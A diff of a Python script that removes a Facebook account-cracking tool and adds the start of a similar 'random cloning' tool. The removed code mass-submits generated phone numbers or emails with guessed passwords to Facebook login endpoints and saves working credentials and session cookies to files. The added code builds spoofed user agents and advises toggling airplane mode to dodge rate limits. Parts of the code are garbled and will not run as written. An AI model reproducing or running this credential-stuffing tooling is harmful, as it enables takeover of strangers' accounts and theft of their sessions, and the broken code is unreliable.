@@ -1,288 +1,339 @@
-#!/usr/bin/python3
-#-*-coding:utf-8-*-
-#!/usr/bin/python3
-#create by tkm tonmoy 
-#wa.me/+8801766804626
-############------[ MODULES ]------#########
-import os,time,random,string,re,sys,json,uuid,requests
+import time,os,json,sys,re,string, random 
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
-os.system('xdg-open https://github.com/tonmoy404-cyber')
-B = '\x1b[1;90m';R = '\x1b[1;91m';G = '\x1b[1;92m';H = '\x1b[1;93m';BL = '\x1b[1;94m';BG = '\x1b[1;95m';S = '\x1b[1;96m';W = '\x1b[1;97m';EX = '\x1b[0m';E = '\33[m'
-############------[ XXXX ]------#########
-lk=[];ok=[];cp=[];twf=[];lop=0;xode=[];plist=[];paxd=[];cpx=[];cokix=[];apkx=[];paswtrh = [];rcd=[];rcdx=[];mthx=[];ugnm=[];psd=[]
-version="1.09"
-def line():
-	print(f"{W}{40*'-'}{W}")
-############------[ RANDOM SYS ]------#########
-AFGX=f"{W}[{G}+{W}] AFG SIM CODE : {G}0780 0771 0799 0701{E}{W}";BDX=f"{W}{W}[{G}+{W}] BD SIM CODE: {G}017 015 018 019 013 016{E}{W}";INDX=f"{W}{W}[{G}+{W}] OTHER COUNTRY USER : {G}+91967 +91894{E}{W}\n{40*'-'}\n{W}{W}[{G}+{W}] IND SIM CODE : {G}967 783 894 879 638{E}{W}";PAKX=f"{W}{W}[{G}+{W}] PAK SIM CODE : {G}0306 0315 0335 0345{E}{W}";NEPX=f"{W}{W}[{G}+{W}] NEP SIM CODE : {G}9868 9865 9818 9817 9845{E}{W}";USEX=f"{W}{W}[{G}+{W}] USA SIM CODE : {G}941 816 308 225{E}{W}";NGRA=f"{W}{W}[{G}+{W}] NAGERIA SIM CODE:{G}070 080 081 090 091{E}{W}";LIMITX=f"{W}[{G}+{W}] EXAMPLE: {G}1000{W},{G}5000{W},{G}10000{W},{G}15000{W},{G}20000{W}";NOSIMX=f'         {G}USE YOUR SIM CODE {W}\n{40*"-"}\n{G}\t    Last Range 7{W}'
-############------[ A SYS ]------#########
-CPG=f"[{G}+{W}] Do you went show cp account (y/n)";CKIG=f"[{G}+{W}] Do you went show cookie (y/n)";chc=f'{W}[{G}+{E}] Choice : {G}';flp=f"{W}[{G}•{W}] PUT FILE PATH\033[1;37m : {G}";chcps=f'EXAMPLE: {G}first123{W},{G}last123{W},{G}firstlast{W},{G}name{W}';mxxt=f'{W}[{G}A{W}] Method {G}1{W}\n{W}[{G}B{W}] Method {G}2{W}';nflp=f"[{R}!{W}] FILE LOCATION NOT FOUND ";FSNM=f"{W}EXAMPLE : {G}rakib{W},{G}sakib{W},{G}rabbi{W},{G}tanvir{W},{G}jahid{W}";LSNM=f"{W}EXAMPLE : {G}hosain{W},{G}mahmud{W},{G}islam{W},{G}ahmed{W},{G}khan{W}";GMLN=f"{W}EXAMPLE : {G}@gmail.com{W} , {G}@yahoo.com{W} {R}ETC{G}...{W}";EPS1=f'{W}Don\'t try : {G}123{W},{G}1234{W},{G}12345{W},{G}@@##{W},{G}@@@{W},{G}@@{W},{G}@{W} ';EPS2=f"{W}Try it : {G}1122{W},{G}@#{W},{G}##{W},{G}@@@@{W},{G}@123{W},{G}@12345{W},{G}11{W}";apsd=f"{W}[{G}A{W}] {W}AUTO PASSWORD {W}\n{W}[{G}B{W}]{W} CHOICE PASSWORD{W}"
-############------[ LOGO ]------#########
-def logo():
-	os.system('clear');print(f"""\r\r\x1b[1;97m{W}\n88888888888 888    d8P  888b     d888 \n    888     888   d8P   8888b   d8888{W} \n    888     888  d8P    88888b.d88888 \n    888     888d88K     888Y88888P888{W} \n    888     8888888b    888 Y888P 888 \n    888     888  Y88b   888  Y8P  888{W} \n    888     888   Y88b  888   "   888 \n    888     888    Y88b 888       888\n{40*"-"} \x1b[1;97m\n[{G}+{W}] GITHUB   : tonmoy404-cyber        \n[{G}+{W}] FACEBOOK : TONMOY X X X     {B}[{W}V{W}:{G}{version}{B}]{W}\n{40*"-"}\x1b[1;97m""")
-############------[ COUNTRY ]------#########
-def YF():
-	logo();print(f'{W}[{G}A{W}] FROM {G}BANGLADESH{W}');print(f'{W}[{G}B{W}] FROM {G}PAKISTAN{W}');print(f'{W}[{G}C{W}] FROM {G}INDIA{W}');print(f'{W}[{G}D{W}] FROM {G}AFGHANISTAN{W}');print(f'{W}[{G}E{W}] FROM {G}NEPAL{W}');print(f'{W}[{G}F{W}] FROM {G}UNITED STATES{W}');print(f'{W}[{G}G{W}] FROM {G}NIGERIA{W}');print(f'{W}[{G}H{W}] {W}MY {W}COUNTRY{R} IS {R}NOT HERE{W}');print(f"{W}[{G}I{W}] CONTACT {G}ADMIN{W}");line()
-	ghx=input(f'[{G}+{W}] Choice : {G}')
-	if ghx in ["A","a","1"]:rcd.append(f'1');Main()
-	elif ghx in ["B","b","2"]:rcd.append(f'2');Main()
-	elif ghx in ["C","c","3"]:rcd.append(f'3');Main()
-	elif ghx in ["D","d","4"]:rcd.append(f'4');Main()
-	elif ghx in ["E","e","5"]:rcd.append(f'5');Main()
-	elif ghx in ["F","f","6"]:rcd.append(f'6');Main()
-	elif ghx in ["G","g","7"]:rcd.append(f'7');Main()
-	elif ghx in ["H","h","8"]:rcd.append(f'8');Main()
-	elif ghx in ["I","i","9"]:cadmin()
-	else:line();print(f'\n \t {R}Choose valid option{E}');time.sleep(1);YF()
-############------[ MENU ]------#########
-def Main():
-	logo();print(f'{W}[{G}A{W}] CRACK {G}FILE{W}');print(f'{W}[{G}B{W}] CRACK {G}RANDOM{W}');print(f'{W}[{G}C{W}] CRACK {G}GMAIL{W}');print(f'{W}[{G}D{W}] CRACK {G}USERNAME{W}');print(f'{W}[{G}E{W}] CRACK {G}GMAIL{H}+{G}USERNAME{W}');print(f"{W}[{G}F{W}] CONTACT {G}ADMIN{W}");print(f'{W}[{G}X{W}] {R}EXIT{W}')
-	line()
-	gh=input(f'[{G}+{W}] Choice : {G}')
-	if gh in ["A","a","1"]:menu1()
-	elif gh in ["B","b","2"]:rmenu1()
-	elif gh in ["C","c","3"]:ugnm.append(f'1');menu3()
-	elif gh in ["D","d","4"]:ugnm.append(f'2');menu3()
-	elif gh in ["E","e","5"]:ugnm.append(f'3');menu3()
-	elif gh in ["F","f","6"]:cadmin()
-	elif gh in ["X","x","7"]:YF()
-	else:line();print(f'\n \t {R}Choose valid option{E}');time.sleep(1);Main()
-############------[CONTACT-ADMIN]-------#########
-def cadmin():
-	logo();print(f"[{G}A{W}] CONTACT {G}FACEBOOK{W}");print(f"[{G}B{W}] CONTACT {G}WHATSAPP{W}");print(f"[{G}C{W}] CONTACT {G}TELEGRAM{W}");print(f"[{G}D{W}] FOLLOW {G}GITHUB{W}");print(f"[{G}E{W}] GROUP {G}FACEBOOK{W}");print(f"[{G}F{W}] GROUP {G}MESSENGER{W}");print(f'[{G}X{W}] {R}EXIT{W}');line()
-	ghx=input(f"[{G}+{W}] Choice : {G}")
-	if ghx in ["A","a","1"]:os.system('xdg-open https://www.facebook.com/profile.php?id=100089388525050');time.sleep(2);cadmin()
-	elif ghx in ["B","b","2"]:os.system('xdg-open https://github.com/tonmoy404-cyber');time.sleep(2);cadmin()
-	elif ghx in ["C","c","3"]:os.system('xdg-open https://t.me/tonmoymahato');time.sleep(2);cadmin()
-	elif ghx in ["D","d","4"]:os.system('xdg-open https://github.com/tonmoy404-cyber');time.sleep(2);cadmin()
-	elif ghx in ["E","e","5"]:os.system('xdg-open https://facebook.com/groups/2470754783080486/');time.sleep(2);cadmin()
-	elif ghx in ["F","f","6"]:os.system('xdg-open https://m.me/j/AbZax-WxyuojLcak/');time.sleep(2);cadmin()
-	elif ghx in ["X","x","7"]:Main()
-	else:line();print(f'\n \t {R}Choose valid option{E}');time.sleep(1);cadmin()
-	############------[FILE SYSTEM]-------#########
-mxxxt=[]
-ixd=[]
-fil=[]
-def menu1():
-	os.system('xdg-open https://github.com/tonmoy404-cyber')
-	logo()
-	fl = input(f'{flp}')
-	try:fil = open(fl,'r').read().splitlines()
-	except FileNotFoundError:print(f"{W}{40*'-'}");print(f'{nflp}');time.sleep(1);menu1()
-	for xid in fil:
-		ixd.append(xid)
-	print(f"{W}{40*'-'}");print(f'{mxxt}');line()
-	mtx=input(f'{chc}')
-	if mtx in ['n','N','no','NO','2']:mxxxt.append(f'2')
-	else:mxxxt.append(f'1')
-	print(f"{W}{40*'-'}");print(f'{CKIG}');line()
-	ckiv=input(f'{chc}')
-	if ckiv in ['n','N','no','NO','2']:cokix.append(f'n')
-	else:cokix.append(f'y')
-	try:
-		logo();print(f'\t\t{G}7 BEST{W}');print (40*"-")
-		psl = int(input(f'[{G}+{W}] Limit : {G}'))
-	except:psl=1
-	print(f"{W}{40*'-'}");print(f'{chcps}');print (40*"-")
-	for ox in range(psl):paxd.append(input(f'{W}[{G}{ox+1}{W}] Password : {G}'))
-	pswx(fil)
-def pswx(fil):
-	with ThreadPool(max_workers=30) as tonxoys:
-		tid = str(len(fil))
-		logo();print(f'{W}[{G}+{W}] TOTAL ID :\033[1;92m '+tid);print(f'{W}[{G}+{W}] FLIGHT MODE ON/OFF EVERY 3 MINUTES');print(40*"-")
-		#os.system('xdg-open https://facebook.com/groups/2470754783080486/')
-		for uuxxd in ixd:
-			id,name= uuxxd.split(f'|')
-			psdx=paxd
-			for pxxd in psdx:
-				fn = name.split(' ')[0]
-				try:ln = name.split(' ')[1]
-				except:ln = fn
-				psd = pxxd.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
-				if mxxxt in ["1","01","A","a"]:tonxoys.submit(graph,id,psd)
-				if mxxxt in ["2","02","B","b"]:tonxoys.submit(api,id,psd)
-############------[RANDOM]-------#########
-def rmenu1():
-	#os.system('xdg-open https://github.com/tonmoy404-cyber')
-	logo()
-	if "1" in rcd:print(f"{BDX}");line()
-	if "2" in rcd:print(f"{PAKX}");line()
-	if "3" in rcd:print(f"{INDX}");line()
-	if "4" in rcd:print(f"{AFGX}");line()
-	if "5" in rcd:print(f"{NEPX}");line()
-	elif "6" in rcd:print(f"{USEX}");line()
-	elif "7" in rcd:print(f"{NGRA}");line()
-	elif "8" in rcd:print(f"{NOSIMX}");line()
-	code=input(f'{chc}');print(f"{W}{40*'-'}")
-	print(f'{LIMITX}');line()
-	limit=int(input(f'[{G}+{E}] Limit : {G}'))
-	print(f"{W}{40*'-'}");print(f'{mxxt}');line()
-	mtx=input(f'{chc}')
-	print(f"{W}{40*'-'}");print(f'{CKIG}');line()
-	ckiv=input(f'{chc}')
-	if ckiv in ['n','N','no','NO','2']:cokix.append(f'n')
-	else:cokix.append(f'y')
-	for number in range(limit):
-		if "1" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(8));xode.append(numberx)
-		if "2" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(7));xode.append(numberx)
-		if "3" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(7));xode.append(numberx)
-		if "4" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(7));xode.append(numberx)
-		if "5" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(6));xode.append(numberx)
-		elif "6" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(8));xode.append(numberx)
-		elif "7" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(8));xode.append(numberx)
-		elif "8" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(7));xode.append(numberx)
-	with ThreadPool(max_workers=60) as tonxoys:
-		tid= str(len(xode))
-		logo();print(f'{W}[{G}+{W}] TOTAL ID :\033[1;92m '+tid);print(f'{W}[{G}+{W}] FLIGHT MODE ON/OFF EVERY 3 MINUTES');line()
-		#os.system('xdg-open https://facebook.com/groups/2470754783080486/')
-		for rngx in xode:
-			name=f"{rngx}"
-			id=code+rngx
-			if "1" in rcd:psd=[id,rngx,id[:6],id[:7],id[:8],id[4:],id[5:]]
-			if "2" in rcd:psd=[id,rngx,"khan123","khan1122","khan12345"]
-			if "3" in rcd:psd=["57575751","57273200","59039200",id[4:],id[3:]]
-			if "4" in rcd:psd=[id,rngx,"200200","500500"]
-			if "5" in rcd:psd=[id,rngx,"FreeFire","freefire"]
-			elif "6" in rcd:psd=[id,rngx,"500500","200200"]
-			elif "7" in rcd:psd=[id,rngx,"500500","200200"]
-			elif "8" in rcd:psd=[id,rngx,"500500","200200"]
-			if mtx in ["1","01","A","a"]:tonxoys.submit(graph,id,psd,name)
-			if mtx in ["2","02","B","b"]:tonxoys.submit(api,id,psd,name)
-############------[GMAIL-USERNAME]-------#########
-def menu3():
-	#os.system('xdg-open https://github.com/tonmoy404-cyber')
-	logo()
-	print(f'{FSNM} ');line()
-	frs=input(f'{W}[{G}+{E}] Fast Name : {G}');print(f"{W}{40*'-'}")
-	print(f'{LSNM}');line()
-	lst=input(f'{W}[{G}+{E}] Last Name : {G}');print(f"{W}{40*'-'}");print(f'{LIMITX} ');line()
-	limit=int(input(f'[{G}+{E}] Limit : {G}'))
-	print(f"{W}{40*'-'}");print(f'{mxxt}');line()
-	mtx=input(f'{chc}')
-	print(f"{W}{40*'-'}");print(f'{CKIG}');line()
-	ckiv=input(f'{chc}')
-	if ckiv in ['n','N','no','NO','2']:cokix.append(f'n')
-	else:cokix.append(f'y')
-	try:
-		logo();print(f'\t\t{G}7 BEST{W}');print (40*"-")
-		psl = int(input(f'[{G}+{W}] Password Limit : {G}'))
-	except:psl=1
-	print(f"{W}{40*'-'}");print(f'{chcps}');print (40*"-")
-	for ox in range(psl):paswtrh.append(input(f'{W}[{G}{ox+1}{W}] Password : {G}'))
-	lxtx = ['1','2','4','5','6','7','8','9']
-	for gmnu in range(limit):
-		lcxt = random.choice(lxtx)
-		if '1' in lcxt:digx = ''.join(random.choice(string.digits) for _ in range(1,2));xode.append(digx)
-		if '2' in lcxt:digx = ''.join(random.choice(string.digits) for _ in range(1,3));xode.append(digx)
-		if '4' in lcxt:digx = ''.join(random.choice(string.digits) for _ in range(1,5));xode.append(digx)
-		if '5' in lcxt:digx = ''.join(random.choice(string.digits) for _ in range(1,6));xode.append(digx)
-		if '6' in lcxt:digx = ''.join(random.choice(string.digits) for _ in range(1,7));xode.append(digx)
-		if '7' in lcxt:digx = ''.join(random.choice(string.digits) for _ in range(1,8));xode.append(digx)
-		if '8' in lcxt:digx = ''.join(random.choice(string.digits) for _ in range(1,9));xode.append(digx)
-		if '9' in lcxt:digx = ''.join(random.choice(string.digits) for _ in range(1,10));xode.append(digx)
-		else:digx = ''.join(random.choice(string.digits) for _ in range(1,4));xode.append(digx)
-	with ThreadPool(max_workers=30) as tonxoys:
-		tid= str(len(xode))
-		logo();print(f'{W}[{G}+{W}] TOTAL ID :\033[1;92m '+tid);print(f'{W}[{G}+{W}] FLIGHT MODE ON/OFF EVERY 3 MINUTES');line()
-		#os.system('xdg-open https://facebook.com/groups/2470754783080486/')
-		for rngx in xode:
-			name=frs+" "+lst
-			if "1" in ugnm:id=frs+lst+rngx+"@gmail.com"
-			if "2" in ugnm:id=random.choice([frs+lst+"."+rngx,frs+lst+rngx])
-			elif "3" in ugnm:id=random.choice([frs+lst+rngx,frs+lst+rngx+"@gmail.com"])
-			for thdhy in paswtrh:psd.append(thdhy)
-			if mtx in ["1","01","A","a"]:tonxoys.submit(graph,id,psd,name)
-			if mtx in ["2","02","B","b"]:tonxoys.submit(api,id,psd,name)
-############------[ USER-AGENT ]------#########
 
-############------[METHOD-1-A]-------#########
-def graph(id,psd):
-	try:
-		global ok,cp,twf,lop
-		sys.stdout.write(f'\r{W}[{G}TONMOY-M1{W}]{E}-{W}[{G}%s{W}]{E}-{W}[OK:{G}%s{W}]{E}\r'%(lop,len(ok)));sys.stdout.flush()
-		for pxw in psd:
-			psw = pxw
-			ua=ua1()
-			apk = ['438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28', '350685531728|62f8ce9f74b12f84c123cc23437a4a32', '6628568379|c1e620fa708a1d5696fb991c1bde5662', '1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae', '1348564698517390|007c0a9101b9e1c8ffab727666805038']
-			app = random.choice(apk)
-			random_seed = random.Random()
-			url = 'https://b-graph.facebook.com/auth/login'
-			datax={'adid': uuid.uuid4(),'format': 'json','device_id': uuid.uuid4(),'email': id, 'password': psw,'generate_analytics_claims': '1','community_id': '', 'cpl': 'true','try_num': '1','family_device_id': uuid.uuid4(),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled','enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US"','client_country_code': 'US','fb_api_req_friendly_name': 'authenticate','api_key': '882a8490361da98702bf97a021ddc14d','access_token': app}
-			headerx= {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": "[FBAN/EMA;FBLC/en_US;FBAV/540.602.473.468;FBBV/705748034;FBDV/A7;FBMD/oppo;FBSN/82.0.0.1825;FBPN/com.facebook.orca]","X-FB-Net-HNI": str(random.randint(2e4,4e4)),"X-FB-SIM-HNI": str(random.randint(2e4,4e4)),"X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
-			twfx= 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-			logx= requests.post(url,data=datax,headers=headerx).json()
-			if 'session_key' in logx:
-				try:iid = str(logx['uid'])
-				except:iid=id
-				coki=f"xr={''.join(random.choices(string.ascii_letters+string.digits+'_',k=24))};" +";".join(f"{i['name']}={i['value']}" for i in json.loads(logx)["session_cookies"])
-				check = requests.get(f"xd").text
-				if 'LIVE' in check:
-					print(f'\r\r{G}[TONMOY-OK] '+iid+' | '+psw+f'{W}')
-					ok.append(id)
-					open('/sdcard/TKM/OK-UID.txt', 'a').write(iid+' | '+psw+"\n");open('/sdcard/TKM/OK-NUMBER.txt', 'a').write(id+"\n");open('/sdcard/TKM/OK-COOKIE.txt', 'a').write(iid+'  ------------>>>'+coki+"\n")
-					break
-				else:
-					print(f'\r\r{S}[TONMOY-LK] '+iid+' | '+psw+f'{W}')
-					lk.append(id)
-					open('/sdcard/TKM/LOCK-UID.txt', 'a').write(iid+' | '+psw+"\n");open('/sdcard/TKM/LOCK-NUMBER.txt', 'a').write(id+"\n");open('/sdcard/TKM/LOCK-COOKIE.txt', 'a').write(iid+'  ------------>>>'+coki+"\n")
-					break
-				if 'y' in cokix:print(f'\r\r{R}[{G}COOKIES🍪{R}]{W} : {G}'+coki+f'{E}');print(f"{W}{40*'-'}{E}")
-				break
-			elif twfx in str(logx):
-				try:iid = logx['error']['error_data']['uid']
-				except:iid=id
-				print(f'\r\r{R}[TONMOY-CP] '+iid+' | '+psw+f'{W}')
-				open('/sdcard/TKM/CP-UID.txt', 'a').write(iid+' | '+psw+"\n");open('/sdcard/TKM/CP-NUMBER.txt', 'a').write(id+"\n")
-				cp.append(id)
-				break
-			else:continue
-	except requests.exceptions.ConnectionError:time.sleep(10)
-	lop+=1
-############------[METHOD-2-B]-------#########
-def api(id,psd,name):
-	os.system('xdg-open https://facebook.com/groups/2470754783080486/')
-	try:
-		global ok,cp,twf,lop
-		fn = name.split(' ')[0]
-		try:ln = name.split(' ')[1]
-		except:ln = fn
-		sys.stdout.write(f'\r{W}[{G}TONMOY-M1{W}]{E}-{W}[{G}%s{W}]{E}-{W}[OK:{G}%s{W}]{E}\r'%(lop,len(ok)));sys.stdout.flush()
-		for pxw in psd:
-			psw = pxw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
-			ua="[FBAN/FB4A;FBAV/148.0.0.94.498;FBBV/346484979;FBDM/{density=3.0,width=1080,height=2376};FBLC/en_GB;FBRV/47141262;FBCR/Zong;FBMF/INFINIX;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X676C;FBSV/12;FBOP/19;FBCA/arm64-v8a:armeabi-v7a:armeabi;]"
-			url = 'https://b-api.facebook.com/method/auth.login'
-			headerx={'content-type':'application/x-www-form-urlencoded','x-fb-sim-hni':str(random.randint(2e4,4e4)),'x-fb-connection-type':'unknown','Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','user-agent':ua,'x-fb-net-hni':str(random.randint(2e4,4e4)),'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),'x-fb-connection-quality':'EXCELLENT','x-fb-friendly-name':'authenticate','accept-encoding':'gzip, deflate','x-fb-http-engine':	'Liger'}
-			datax={'email':id,'password':psw,'cpl':'true', 'credentials_type':'password',  'error_detail_type':'button_with_disabled', 'source':'login', 'format':'json', 'generate_session_cookies':'1', 'generate_analytics_claim':'1','generate_machine_id':'1'}
-			lo = requests.post(url,data=datax,headers=headerx,allow_redirects=False).text
-			twfx= 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-			logx = json.loads(lo)
-			if 'session_key' in logx:
-				try:iid = str(logx['uid'])
-				except:iid=id
-				check = requests.get(f"xd").text
-				coki=f"xr={''.join(random.choices(string.ascii_letters+string.digits+'_',k=24))};" +";".join(f"{i['name']}={i['value']}" for i in json.loads(lo)["session_cookies"])
-					print(f'\r\r{G}[TONMOY-OK] '+iid+' | '+psw+f'{W}')d/TKM/OK-UID.txt', 'a').write(iid+' | '+psw+"\n")
-                    open('/sdcard/TKM/OK-NUMBER.txt', 'a').write(id+"\n");
-                    open('/sdcard/TKM/OK-COOKIE.txt', 'a').write(iid+'  ------------>>>'+coki+"\n")
-					break
-				else:
-					print(f'\r\r{S}[TONMOY-LK] '+iid+' | '+psw+f'{W}')
-					lk.append(id)
-					open('/sdcard/TKM/LOCK-UID.txt', 'a').write(iid+' | '+psw+"\n");open('/sdcard/TKM/LOCK-NUMBER.txt', 'a').write(id+"\n");open('/sdcard/TKM/LOCK-COOKIE.txt', 'a').write(iid+'  ------------>>>'+coki+"\n")
-					break
-				if 'y' in cokix:print(f'\r\r{R}[{G}COOKIES🍪{R}]{W} : {G}'+coki+f'{E}');print(f"{W}{40*'-'}{E}")
-				break
-			elif twfx in str(logx):
-				try:iid = logx['error']['error_data']['uid']
-				except:iid=id
-				print(f'\r\r{R}[TONMOY-CP] '+iid+' | '+psw+f'{W}')
-				open('/sdcard/TKM/CP-UID.txt', 'a').write(iid+' | '+psw+"\n");open('/sdcard/TKM/CP-NUMBER.txt', 'a').write(id+"\n")
-				cp.append(id)
-				break
-			else:continue
-	except requests.exceptions.ConnectionError:time.sleep(10)
-	lop+=1
-##################
-try:YF()
-except requests.exceptions.ConnectionError:print('\n No internet connection ...');exit()
-except:exit()
+
+try:
+    import rich
+except:
+    print("\n[!?] Installing Rich...\n")
+    os.system("pip install rich")
+    import rich
+
+try:
+    import requests
+except:
+    print("\n[!?] Installing Requests...\n")
+    os.system("pip install requests")
+    import requests
+
+try:
+    import httpx
+except:
+    print("\n[!?] Installing Httpx...\n")
+    os.system("pip install httpx")
+    import httpx
+
+try:
+    import bs4
+except:
+    print("\n[!?] Installing Bs4...\n")
+    os.system("pip install bs4")
+    import bs4
+
+
+
+from os import system as shell
+from rich import print
+from rich import print_json
+from rich import pretty
+from rich.progress import track
+from rich.markdown import Markdown
+from rich.tree import Tree
+from rich.panel import Panel
+from rich.padding import Padding
+pretty.install()
+
+from datetime import datetime 
+ct=str(datetime.now())
+ct2=ct.split(" ")[0]
+ct3=ct2.split("-")[1]
+mon={"01":"January","02":"February","03":"March","04":"April","05":"May","06":"June","07":"July","08":"August","09":"September","10":"October","11":"November","12":"December"}
+month=mon[ct3]
+datea=ct2.split("-")[2]
+
+
+def lod(message):
+    
+    for i in track(range(300), description=f"[red][bold] {message}"):
+        time.sleep(0.01)
+
+
+
+def clear():
+    shell("clear")
+
+def logo():
+    clear()
+    print("""
+   _ __ ___  ___   _   _  __
+  /// // _/ / o |,' \ / |/ /
+ / ` // _/ /  ,'/ o |/ || / 
+/_n_//___//_/`_\|_,'/_/|_/       0.1
+    """)
+    
+def space():
+    print("\n")
+
+
+number=int("+8801944981090")
+
+devoloper_info={
+    "Developer" :  'HERON AFRIDI',
+    "Number" :  number,
+    "Status" :  '24-ONLINE',
+    "GitHub Url":  'https://github.com/TEAM-ELITE1',
+    "Facebook" :  'facebook.com/Freestyle.0fficial',
+    }
+
+date={
+    "Day":datea,
+    "Month":month,
+ }
+mj=Tree("[bold purple]![[bold red]A[bold purple]] ")
+mj.add("[cyan][bold]RANDOM CLONEING ").add("[bold green][GOOD]")
+
+mx=Tree("[bold purple]![[bold red]B[bold purple]] ")
+mx.add("[bold yellow]FILE CLONEING").add("[bold green][GREAT]")
+
+my=Tree("[bold purple]![[bold red]C[bold purple]] ")
+my.add("[tan][bold]REPORT BUG ")
+
+cv=Tree("[bold blue][>+<]")
+cv.add("[bold red]Choice Option")
+
+
+
+ugen=[]
+for ua in range(12000):
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['8','9','10','11','12','13','14','15'])
+	y=random.choice(['RMX3572','RMX3395','RMX3396','RMX2117','RMX3161','RMX3121','RMX3125','RMX3041','RMX2200','RMX2111','RMX2111','RMX3560'])
+	c='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	d=random.randrange(40,115)
+	e='0'
+	f=random.randrange(3000,6000)
+	g=random.randrange(20,168)
+	h='Mobile Safari/537.36'
+	rocky=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
+	ugen.append(rocky)
+	
+for ua in range(10000):
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['6','7','8','9','10','11','12','13'])
+	c=random.choice(['SM-M546B','SM-N981B','SSM-N981N','SM-N981W','SM-N985F','SM-N900','SM-N9002','LM-Q710(FGN)'])
+	d=') Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	e=random.randrange(92,115)
+	x='0'
+	f=random.randrange(4200,6000)
+	g=random.randrange(62,199)
+	h='Mobile Safari/537.36'
+	lol=f'{a} {b}; {c}{d}{e}.{x}.{f}.{g} {h}'
+	ugen.append(lol)
+
+ua = [
+"Mozilla/5.0 (Linux; Android 12; RMX2111 Build/SP1A.210812.016; ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.69 Mobile Safari/537.36 BingSapphire/24.1.410218302",
+"Mozilla/5.0 (Linux; Android 11; RMX2121 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 GSA/13.7.7.23.arm64",
+"Dalvik/1.6.0 (Linux; U; Android 5; SM-G3518 Build/JLS36C) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188827991;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G3518;FBSV/4.4.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1244};FB_FW/1;FBRV/190301973",
+"Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1",
+]
+
+
+note1="""- __Inbox__ Me for Join `Team Elite`\n- Try tool and **Review**"""
+n1=Markdown(note1)
+
+note2="""#  __RANDOM CLONEING TASK BOX__\n- Choice BD code \n- And Put Limit"""
+n2=Markdown(note2)
+
+note3="""- __System__ Starting Bro Wait\n- Follow our **FB Group**\n- Inbox Me For Anything"""
+n3=Markdown(note3)
+
+note4="""- Use Airplane mode in every 3 minutes \n- Use APN For Get More Ok ID \n- Cracking Started """
+n4=Markdown(note4)
+
+nv = Padding("TOOL MENU", style="on green", expand=False)
+cxx = Padding("DONE",(1,2), style="on green", expand=False)
+
+
+
+import os
+try:
+    open(".itu.txt","r").read()
+except:
+    os.system("pkg install play-audio")
+    open(".itu.txt","w").write("__&")
+try:
+    import gtts
+except:
+    os.system("pip install gtts")
+    import gtts
+from gtts import gTTS
+
+def create_(text,file):
+    my_a = gTTS(text)
+    my_a.save(file)
+
+
+def play_audio(audio_file):
+    os.system("play-audio "+audio_file)
+
+def dual(text,file):
+    create_(text,file)
+    play_audio(file)
+    
+
+ok=[]
+ok.append("199")
+loop=0
+def main():
+    logo()
+    space()
+    print(n3)
+    space()
+    lod("STARTING TOOL...")
+    logo()
+    print_json(data=devoloper_info)
+    print(Panel(n1,title="[bold red]NOTE"))
+    space()
+    #dual("Hello bro,I am Zara,I am an artificial intelligent,and welcome to our tool","y.mp3")
+    
+    print(nv)
+    space()
+    print(mj)
+    print(mx)
+    print(my)
+    space()
+    print(cv)
+    choice=input("    └──>")
+    if choice in ["a","A","1","01"]:
+        numb()
+    else:
+        numb()
+
+def numb():
+    user=[]
+    logo()
+    
+    print(n2)
+    space()
+    print("    [bold red]CODE               [bold yellow] ✓ [bold green]Example 017, 019, 016, ")
+    code=input("                        ✓ Choice ->")
